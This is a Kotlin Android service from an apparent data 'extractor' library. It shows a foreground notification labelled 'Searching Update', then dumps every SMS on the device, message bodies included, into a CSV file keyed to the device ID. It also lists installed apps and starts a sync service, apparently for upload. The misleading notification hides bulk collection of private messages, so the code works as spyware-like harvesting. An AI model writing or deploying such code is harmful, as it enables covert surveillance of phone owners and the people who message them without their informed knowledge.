package info.kalagato.com.extractor.readers

import android.Manifest
import info.kalagato.com.extractor.Util.getDeviceId
import info.kalagato.com.extractor.Util.getLastSyncTime
import info.kalagato.com.extractor.Util.setLastSyncDateTime
import android.content.Intent
import info.kalagato.com.extractor.Extractor
import android.app.PendingIntent
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import info.kalagato.com.extractor.readers.AppRunningStatus
import info.kalagato.com.extractor.SyncService
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import info.kalagato.com.extractor.Constant
import info.kalagato.com.extractor.R
import java.io.File
import java.io.FileWriter
import java.lang.Exception
import java.text.SimpleDateFormat
import java.util.*

class ReadSMSService : Service() {
    private val TAG = "read-sms-service"
    private var mServiceLooper: Looper? = null
    private var mServiceHandler: ServiceHandler? = null
    override fun onCreate() {
//        Log.d(TAG,"onCreate");
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
        val thread = HandlerThread("SMS_ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND)
        thread.start()

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.looper
        mServiceHandler = ServiceHandler(mServiceLooper)
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
//        Log.d(TAG,"onStartCommand");
        val notificationIntent = Intent(applicationContext, Extractor::class.java)
        val pendingIntent = PendingIntent.getActivity(
            applicationContext,
            0, notificationIntent, 0
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                Constant.CHANNEL_ID,
                "My Foreground Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = ContextCompat.getSystemService(
                applicationContext, NotificationManager::class.java
            )
            manager?.createNotificationChannel(chan)
        }
        val notification = NotificationCompat.Builder(
            applicationContext,
            Constant.CHANNEL_ID
        ) //todo fix hardcoded channel id
            .setSmallIcon(R.drawable.ic_settings)
            .setOngoing(true)
            .setContentTitle("Searching Update")
            .setContentText("")
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1, notification)
        try {
//            Log.d(TAG,"sending msg");
            // For each start request, send a message to start a job and deliver the
            // start ID so we know which request we're stopping when we finish the job
            val msg = mServiceHandler!!.obtainMessage()
            msg.arg1 = startId
            // Create a bundle with the data
            val bundle = Bundle()

            // Set the bundle data to the Message
            msg.data = bundle
            mServiceHandler!!.sendMessage(msg)
        } catch (e: Exception) {
//            Log.d("read-sms-service","error in starting handler",e);
        }

        //do heavy work on a background thread
//        Log.d(TAG,"do your work");
        //stopSelf();
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        stopForeground(true)
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    // Handler to run on a thread to work in background
    private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
        override fun handleMessage(msg: Message) {
//            Log.d(TAG,"handleMessage");
            val smsAvailable = sMS
            AppRunningStatus().getAllPackageInstalled(applicationContext)
            //            new AppRunningStatus().getAppUsage(getApplicationContext());

            //checking sync
            val serviceIntent = Intent(applicationContext, SyncService::class.java)
            ContextCompat.startForegroundService(applicationContext, serviceIntent)
            // Stop the service using the startId, so that we don't stop
            // the service in the middle of handling another job
            stopSelf(msg.arg1)
        }

        val sMS: Boolean
            get() {
                // public static final String INBOX = "content://sms/inbox";
                // public static final String SENT = "content://sms/sent";
                // public static final String DRAFT = "content://sms/draft";
                if (applicationContext.checkSelfPermission(Manifest.permission.READ_SMS)
                    != PackageManager.PERMISSION_GRANTED
                ) {
//                    Log.d(TAG,"User did not provided the access");
                    return false
                }
                val folder = File(Environment.getDataDirectory().toString() + "/Folder")
                val mydir = applicationContext.getDir("mydir", MODE_PRIVATE) //Creating an internal dir;

                val c = Calendar.getInstance().time
                val df = SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault())
                val formattedDate = df.format(c)
                val filename = (mydir.toString() + "/" + Constant.SMS + "_"
                        + getDeviceId(applicationContext) + "_" + formattedDate + ".csv")
                //            Log.d(TAG,"filename = "+ filename);
                try {
                    val fw = FileWriter(filename, true)
                    val lastSyncTime = getLastSyncTime(
                        applicationContext
                    )
                    val currentSyncTime = Date().time
                    //                Log.d(TAG,"dateEnd = "+ lastSyncTime);
                    // Now create a SimpleDateFormat object.
                    var filter = ""
                    filter = if (lastSyncTime == 0L) {
                        " date <= $currentSyncTime"
                    } else {
                        " date <= $currentSyncTime and date >= $lastSyncTime"
                    }

//                Log.d(TAG,"filter = "+filter);

                    // Now create the filter and query the messages.
                    val cursor = applicationContext.contentResolver.query( Uri.parse("content://sms/"), null, filter, null, "date desc")
                    if (cursor!!.moveToFirst()) { // must check the result to prevent exception
//                    Log.d(TAG,"No. of messages:" + cursor.getCount());
                        for (idx in 0 until cursor.columnCount) {
                            fw.append(cursor.getColumnName(idx))
                            fw.append(',')
                        }
                        fw.append('\n')
                        do {
                            for (idx in 0 until cursor.columnCount) {
                                if (cursor.getColumnName(idx).equals("body", ignoreCase = true)) {
                                    fw.append("\"" + cursor.getString(idx) + "\"")
                                } else {
                                    fw.append(cursor.getString(idx))
                                }
                                fw.append(',')
                            }
                            fw.append('\n')
                            // use msgData
                        } while (cursor.moveToNext())
                        setLastSyncDateTime(applicationContext, currentSyncTime)
                    } else {
                        // empty box, no SMS
//                    Log.d(TAG,"empty box, no SMS");
                        return false
                    }
                    fw.flush()
                    fw.close()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                return false
            }
    }
}